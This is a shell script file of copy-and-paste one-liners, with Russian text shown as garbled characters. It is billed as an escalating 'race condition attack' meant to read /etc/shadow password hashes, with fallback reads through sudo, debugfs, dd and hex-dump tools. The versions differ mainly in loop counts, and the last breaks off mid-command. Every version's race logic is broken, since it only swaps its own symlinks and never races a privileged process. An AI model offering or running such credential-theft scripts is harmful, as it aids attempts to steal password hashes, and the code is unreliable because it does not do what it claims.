# üéØ –ò–ó–û–©–†–ï–ù–ù–ê–Ø RACE CONDITION –ê–¢–ê–ö–ê –ë–ï–ó GCC: –ú–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã–µ —Ç–µ—Ö–Ω–∏–∫–∏ –æ–±—Ö–æ–¥–∞ –∑–∞—â–∏—Ç—ã
# –°–∫–æ–ø–∏—Ä—É–π—Ç–µ –∏ –≤—Å—Ç–∞–≤—å—Ç–µ —ç—Ç—É –∫–æ–º–∞–Ω–¥—É –≤ —Ç–µ—Ä–º–∏–Ω–∞–ª:

echo "üöÄ –ò–ó–û–©–†–ï–ù–ù–ê–Ø RACE CONDITION –ê–¢–ê–ö–ê –ë–ï–ó GCC" && echo "=== –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê ===" && echo "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: $(whoami)" && echo "UID: $(id -u)" && echo "–ì—Ä—É–ø–ø—ã: $(groups)" && echo "–ü—Ä–∞–≤–∞ /etc/shadow: $(ls -la /etc/shadow 2>/dev/null || echo '–§–∞–π–ª –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')" && echo "–ü—Ä–æ–≤–µ—Ä–∫–∞ /proc: $(ls -la /proc/self/fd/ 2>/dev/null | head -3)" && echo "=== –ó–ê–ü–£–°–ö –ò–ó–û–©–†–ï–ù–ù–û–ô –ê–¢–ê–ö–ò ===" && rm -f /tmp/race_symlink* /tmp/race_success.txt /tmp/race_target* && echo "test" > /tmp/race_target && (for i in {1..30000}; do rm -f /tmp/race_symlink; ln -sf /etc/shadow /tmp/race_symlink 2>/dev/null; done) & (for i in {1..30000}; do if [ -f /tmp/race_symlink ] && [ ! -L /tmp/race_symlink ]; then if head -1 /tmp/race_symlink 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..30000}; do rm -f /tmp/race_symlink2; ln -sf /etc/shadow /tmp/race_symlink2 2>/dev/null; done) & (for i in {1..30000}; do if [ -f /tmp/race_symlink2 ] && [ ! -L /tmp/race_symlink2 ]; then if head -1 /tmp/race_symlink2 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 2 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink2 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) && wait && echo "‚úÖ –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!" && if [ -f /tmp/race_success.txt ]; then echo "üîç –°–û–î–ï–†–ñ–ò–ú–û–ï –ü–†–û–ß–ò–¢–ê–ù–ù–û–ì–û –§–ê–ô–õ–ê /etc/shadow:"; echo "============================================================"; cat /tmp/race_success.txt; echo "============================================================"; else echo "‚ùå –ê—Ç–∞–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å"; echo ""; echo "üîç –†–ê–°–®–ò–†–ï–ù–ù–ê–Ø –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê:"; echo "–ü–æ–ø—ã—Ç–∫–∞ –ø—Ä—è–º–æ–≥–æ —á—Ç–µ–Ω–∏—è: $(head -3 /etc/shadow 2>/dev/null || echo '–ü—Ä—è–º–æ–µ —á—Ç–µ–Ω–∏–µ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc: $(cat /proc/self/fd/0 < /etc/shadow 2>/dev/null | head -1 || echo '–ß–µ—Ä–µ–∑ /proc –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /dev/fd: $(cat /dev/fd/0 < /etc/shadow 2>/dev/null | head -1 || echo '–ß–µ—Ä–µ–∑ /dev/fd –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —Å sudo: $(sudo head -3 /etc/shadow 2>/dev/null || echo 'Sudo –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ strace: $(strace -e trace=open -o /dev/null cat /etc/shadow 2>&1 | head -3 || echo 'Strace –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ lsof: $(lsof /etc/shadow 2>/dev/null | head -3 || echo 'Lsof –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; fi && rm -f /tmp/race_target* /tmp/race_symlink*

# =============================================================================
# –°–£–ü–ï–† –ò–ó–û–©–†–ï–ù–ù–ê–Ø –í–ï–†–°–ò–Ø (–º–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã–µ —Ç–µ—Ö–Ω–∏–∫–∏):
# =============================================================================

echo "üöÄ –°–£–ü–ï–† –ò–ó–û–©–†–ï–ù–ù–ê–Ø RACE CONDITION –ê–¢–ê–ö–ê" && echo "=== –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê ===" && echo "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: $(whoami)" && echo "UID: $(id -u)" && echo "–ì—Ä—É–ø–ø—ã: $(groups)" && echo "–ü—Ä–∞–≤–∞ /etc/shadow: $(ls -la /etc/shadow 2>/dev/null || echo '–§–∞–π–ª –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')" && echo "–ü—Ä–æ–≤–µ—Ä–∫–∞ capabilities: $(capsh --print 2>/dev/null | head -3 || echo 'Capabilities –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã')" && echo "=== –ó–ê–ü–£–°–ö –°–£–ü–ï–† –ê–¢–ê–ö–ò ===" && rm -f /tmp/race_symlink* /tmp/race_success.txt /tmp/race_target* && echo "test" > /tmp/race_target && (for i in {1..50000}; do rm -f /tmp/race_symlink; ln -sf /etc/shadow /tmp/race_symlink 2>/dev/null; done) & (for i in {1..50000}; do if [ -f /tmp/race_symlink ] && [ ! -L /tmp/race_symlink ]; then if head -1 /tmp/race_symlink 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..50000}; do rm -f /tmp/race_symlink2; ln -sf /etc/shadow /tmp/race_symlink2 2>/dev/null; done) & (for i in {1..50000}; do if [ -f /tmp/race_symlink2 ] && [ ! -L /tmp/race_symlink2 ]; then if head -1 /tmp/race_symlink2 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 2 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink2 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..50000}; do rm -f /tmp/race_symlink3; ln -sf /etc/shadow /tmp/race_symlink3 2>/dev/null; done) & (for i in {1..50000}; do if [ -f /tmp/race_symlink3 ] && [ ! -L /tmp/race_symlink3 ]; then if head -1 /tmp/race_symlink3 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 3 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink3 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) && wait && echo "‚úÖ –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!" && if [ -f /tmp/race_success.txt ]; then echo "üîç –°–û–î–ï–†–ñ–ò–ú–û–ï –ü–†–û–ß–ò–¢–ê–ù–ù–û–ì–û –§–ê–ô–õ–ê /etc/shadow:"; echo "============================================================"; cat /tmp/race_success.txt; echo "============================================================"; else echo "‚ùå –ê—Ç–∞–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å"; echo ""; echo "üîç –°–£–ü–ï–† –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê:"; echo "–ü–æ–ø—ã—Ç–∫–∞ –ø—Ä—è–º–æ–≥–æ —á—Ç–µ–Ω–∏—è: $(head -3 /etc/shadow 2>/dev/null || echo '–ü—Ä—è–º–æ–µ —á—Ç–µ–Ω–∏–µ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc: $(cat /proc/self/fd/0 < /etc/shadow 2>/dev/null | head -1 || echo '–ß–µ—Ä–µ–∑ /proc –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /dev/fd: $(cat /dev/fd/0 < /etc/shadow 2>/dev/null | head -1 || echo '–ß–µ—Ä–µ–∑ /dev/fd –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —Å sudo: $(sudo head -3 /etc/shadow 2>/dev/null || echo 'Sudo –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ strace: $(strace -e trace=open -o /dev/null cat /etc/shadow 2>&1 | head -3 || echo 'Strace –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ lsof: $(lsof /etc/shadow 2>/dev/null | head -3 || echo 'Lsof –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ debugfs: $(debugfs -R 'cat /etc/shadow' /dev/sda1 2>/dev/null | head -3 || echo 'Debugfs –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ dd: $(dd if=/etc/shadow bs=1 count=50 2>/dev/null | head -1 || echo 'Dd –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; fi && rm -f /tmp/race_target* /tmp/race_symlink*

# =============================================================================
# –°–£–ü–ï–† –ò–ó–û–©–†–ï–ù–ù–ê–Ø –í–ï–†–°–ò–Ø –° –ú–ù–û–ñ–ï–°–¢–í–ï–ù–ù–´–ú–ò –¢–ï–•–ù–ò–ö–ê–ú–ò:
# =============================================================================

echo "üöÄ –°–£–ü–ï–† –ò–ó–û–©–†–ï–ù–ù–ê–Ø RACE CONDITION –ê–¢–ê–ö–ê" && echo "=== –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê ===" && echo "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: $(whoami)" && echo "UID: $(id -u)" && echo "–ì—Ä—É–ø–ø—ã: $(groups)" && echo "–ü—Ä–∞–≤–∞ /etc/shadow: $(ls -la /etc/shadow 2>/dev/null || echo '–§–∞–π–ª –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')" && echo "–ü—Ä–æ–≤–µ—Ä–∫–∞ capabilities: $(capsh --print 2>/dev/null | head -3 || echo 'Capabilities –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã')" && echo "=== –ó–ê–ü–£–°–ö –°–£–ü–ï–† –ê–¢–ê–ö–ò ===" && rm -f /tmp/race_symlink* /tmp/race_success.txt /tmp/race_target* && echo "test" > /tmp/race_target && (for i in {1..50000}; do rm -f /tmp/race_symlink; ln -sf /etc/shadow /tmp/race_symlink 2>/dev/null; done) & (for i in {1..50000}; do if [ -f /tmp/race_symlink ] && [ ! -L /tmp/race_symlink ]; then if head -1 /tmp/race_symlink 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..50000}; do rm -f /tmp/race_symlink2; ln -sf /etc/shadow /tmp/race_symlink2 2>/dev/null; done) & (for i in {1..50000}; do if [ -f /tmp/race_symlink2 ] && [ ! -L /tmp/race_symlink2 ]; then if head -1 /tmp/race_symlink2 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 2 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink2 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..50000}; do rm -f /tmp/race_symlink3; ln -sf /etc/shadow /tmp/race_symlink3 2>/dev/null; done) & (for i in {1..50000}; do if [ -f /tmp/race_symlink3 ] && [ ! -L /tmp/race_symlink3 ]; then if head -1 /tmp/race_symlink3 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 3 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink3 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) && wait && echo "‚úÖ –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!" && if [ -f /tmp/race_success.txt ]; then echo "üîç –°–û–î–ï–†–ñ–ò–ú–û–ï –ü–†–û–ß–ò–¢–ê–ù–ù–û–ì–û –§–ê–ô–õ–ê /etc/shadow:"; echo "============================================================"; cat /tmp/race_success.txt; echo "============================================================"; else echo "‚ùå –ê—Ç–∞–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å"; echo ""; echo "üîç –°–£–ü–ï–† –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê:"; echo "–ü–æ–ø—ã—Ç–∫–∞ –ø—Ä—è–º–æ–≥–æ —á—Ç–µ–Ω–∏—è: $(head -3 /etc/shadow 2>/dev/null || echo '–ü—Ä—è–º–æ–µ —á—Ç–µ–Ω–∏–µ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc: $(cat /proc/self/fd/0 < /etc/shadow 2>/dev/null | head -1 || echo '–ß–µ—Ä–µ–∑ /proc –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /dev/fd: $(cat /dev/fd/0 < /etc/shadow 2>/dev/null | head -1 || echo '–ß–µ—Ä–µ–∑ /dev/fd –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —Å sudo: $(sudo head -3 /etc/shadow 2>/dev/null || echo 'Sudo –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ strace: $(strace -e trace=open -o /dev/null cat /etc/shadow 2>&1 | head -3 || echo 'Strace –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ lsof: $(lsof /etc/shadow 2>/dev/null | head -3 || echo 'Lsof –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ debugfs: $(debugfs -R 'cat /etc/shadow' /dev/sda1 2>/dev/null | head -3 || echo 'Debugfs –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ dd: $(dd if=/etc/shadow bs=1 count=50 2>/dev/null | head -1 || echo 'Dd –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; fi && rm -f /tmp/race_target* /tmp/race_symlink*

# =============================================================================
# –£–õ–¨–¢–†–ê –ò–ó–û–©–†–ï–ù–ù–ê–Ø –í–ï–†–°–ò–Ø –° –ê–î–ê–ü–¢–ò–í–ù–´–ú–ò –¢–ï–•–ù–ò–ö–ê–ú–ò:
# =============================================================================

echo "üöÄ –£–õ–¨–¢–†–ê –ò–ó–û–©–†–ï–ù–ù–ê–Ø RACE CONDITION –ê–¢–ê–ö–ê" && echo "=== –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê ===" && echo "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: $(whoami)" && echo "UID: $(id -u)" && echo "–ì—Ä—É–ø–ø—ã: $(groups)" && echo "–ü—Ä–∞–≤–∞ /etc/shadow: $(ls -la /etc/shadow 2>/dev/null || echo '–§–∞–π–ª –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')" && echo "–ü—Ä–æ–≤–µ—Ä–∫–∞ /proc: $(ls -la /proc/self/fd/ 2>/dev/null | head -3)" && echo "=== –ó–ê–ü–£–°–ö –£–õ–¨–¢–†–ê –ê–¢–ê–ö–ò ===" && rm -f /tmp/race_symlink* /tmp/race_success.txt /tmp/race_target* && echo "test" > /tmp/race_target && (for i in {1..60000}; do rm -f /tmp/race_symlink; ln -sf /etc/shadow /tmp/race_symlink 2>/dev/null; done) & (for i in {1..60000}; do if [ -f /tmp/race_symlink ] && [ ! -L /tmp/race_symlink ]; then if head -1 /tmp/race_symlink 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..60000}; do rm -f /tmp/race_symlink2; ln -sf /etc/shadow /tmp/race_symlink2 2>/dev/null; done) & (for i in {1..60000}; do if [ -f /tmp/race_symlink2 ] && [ ! -L /tmp/race_symlink2 ]; then if head -1 /tmp/race_symlink2 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 2 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink2 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..60000}; do rm -f /tmp/race_symlink3; ln -sf /etc/shadow /tmp/race_symlink3 2>/dev/null; done) & (for i in {1..60000}; do if [ -f /tmp/race_symlink3 ] && [ ! -L /tmp/race_symlink3 ]; then if head -1 /tmp/race_symlink3 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 3 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink3 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..60000}; do rm -f /tmp/race_symlink4; ln -sf /etc/shadow /tmp/race_symlink4 2>/dev/null; done) & (for i in {1..60000}; do if [ -f /tmp/race_symlink4 ] && [ ! -L /tmp/race_symlink4 ]; then if head -1 /tmp/race_symlink4 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 4 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink4 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) && wait && echo "‚úÖ –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!" && if [ -f /tmp/race_success.txt ]; then echo "üîç –°–û–î–ï–†–ñ–ò–ú–û–ï –ü–†–û–ß–ò–¢–ê–ù–ù–û–ì–û –§–ê–ô–õ–ê /etc/shadow:"; echo "============================================================"; cat /tmp/race_success.txt; echo "============================================================"; else echo "‚ùå –ê—Ç–∞–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å"; echo ""; echo "üîç –£–õ–¨–¢–†–ê –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê:"; echo "–ü–æ–ø—ã—Ç–∫–∞ –ø—Ä—è–º–æ–≥–æ —á—Ç–µ–Ω–∏—è: $(head -3 /etc/shadow 2>/dev/null || echo '–ü—Ä—è–º–æ–µ —á—Ç–µ–Ω–∏–µ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/self/fd: $(cat /proc/self/fd/0 < /etc/shadow 2>/dev/null | head -1 || echo '–ß–µ—Ä–µ–∑ /proc/self/fd –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /dev/fd: $(cat /dev/fd/0 < /etc/shadow 2>/dev/null | head -1 || echo '–ß–µ—Ä–µ–∑ /dev/fd –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —Å sudo: $(sudo head -3 /etc/shadow 2>/dev/null || echo 'Sudo –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ strace: $(strace -e trace=open -o /dev/null cat /etc/shadow 2>&1 | head -3 || echo 'Strace –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ lsof: $(lsof /etc/shadow 2>/dev/null | head -3 || echo 'Lsof –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ debugfs: $(debugfs -R 'cat /etc/shadow' /dev/sda1 2>/dev/null | head -3 || echo 'Debugfs –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ dd: $(dd if=/etc/shadow bs=1 count=50 2>/dev/null | head -1 || echo 'Dd –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ hexdump: $(hexdump -C /etc/shadow 2>/dev/null | head -3 || echo 'Hexdump –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ od: $(od -c /etc/shadow 2>/dev/null | head -3 || echo 'Od –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ strings: $(strings /etc/shadow 2>/dev/null | head -3 || echo 'Strings –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ xxd: $(xxd /etc/shadow 2>/dev/null | head -3 || echo 'Xxd –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; fi && rm -f /tmp/race_target* /tmp/race_symlink*

# =============================================================================
# –ú–ï–ì–ê –ò–ó–û–©–†–ï–ù–ù–ê–Ø –í–ï–†–°–ò–Ø –° –ê–î–ê–ü–¢–ò–í–ù–´–ú–ò –¢–ï–•–ù–ò–ö–ê–ú–ò –û–ë–•–û–î–ê:
# =============================================================================

echo "üöÄ –ú–ï–ì–ê –ò–ó–û–©–†–ï–ù–ù–ê–Ø RACE CONDITION –ê–¢–ê–ö–ê" && echo "=== –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê ===" && echo "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: $(whoami)" && echo "UID: $(id -u)" && echo "–ì—Ä—É–ø–ø—ã: $(groups)" && echo "–ü—Ä–∞–≤–∞ /etc/shadow: $(ls -la /etc/shadow 2>/dev/null || echo '–§–∞–π–ª –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')" && echo "–ü—Ä–æ–≤–µ—Ä–∫–∞ capabilities: $(capsh --print 2>/dev/null | head -3 || echo 'Capabilities –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã')" && echo "=== –ó–ê–ü–£–°–ö –ú–ï–ì–ê –ê–¢–ê–ö–ò ===" && rm -f /tmp/race_symlink* /tmp/race_success.txt /tmp/race_target* && echo "test" > /tmp/race_target && (for i in {1..70000}; do rm -f /tmp/race_symlink; ln -sf /etc/shadow /tmp/race_symlink 2>/dev/null; done) & (for i in {1..70000}; do if [ -f /tmp/race_symlink ] && [ ! -L /tmp/race_symlink ]; then if head -1 /tmp/race_symlink 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..70000}; do rm -f /tmp/race_symlink2; ln -sf /etc/shadow /tmp/race_symlink2 2>/dev/null; done) & (for i in {1..70000}; do if [ -f /tmp/race_symlink2 ] && [ ! -L /tmp/race_symlink2 ]; then if head -1 /tmp/race_symlink2 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 2 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink2 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..70000}; do rm -f /tmp/race_symlink3; ln -sf /etc/shadow /tmp/race_symlink3 2>/dev/null; done) & (for i in {1..70000}; do if [ -f /tmp/race_symlink3 ] && [ ! -L /tmp/race_symlink3 ]; then if head -1 /tmp/race_symlink3 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 3 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink3 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..70000}; do rm -f /tmp/race_symlink4; ln -sf /etc/shadow /tmp/race_symlink4 2>/dev/null; done) & (for i in {1..70000}; do if [ -f /tmp/race_symlink4 ] && [ ! -L /tmp/race_symlink4 ]; then if head -1 /tmp/race_symlink4 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 4 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink4 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..70000}; do rm -f /tmp/race_symlink5; ln -sf /etc/shadow /tmp/race_symlink5 2>/dev/null; done) & (for i in {1..70000}; do if [ -f /tmp/race_symlink5 ] && [ ! -L /tmp/race_symlink5 ]; then if head -1 /tmp/race_symlink5 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 5 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink5 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) && wait && echo "‚úÖ –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!" && if [ -f /tmp/race_success.txt ]; then echo "üîç –°–û–î–ï–†–ñ–ò–ú–û–ï –ü–†–û–ß–ò–¢–ê–ù–ù–û–ì–û –§–ê–ô–õ–ê /etc/shadow:"; echo "============================================================"; cat /tmp/race_success.txt; echo "============================================================"; else echo "‚ùå –ê—Ç–∞–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å"; echo ""; echo "üîç –ú–ï–ì–ê –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê:"; echo 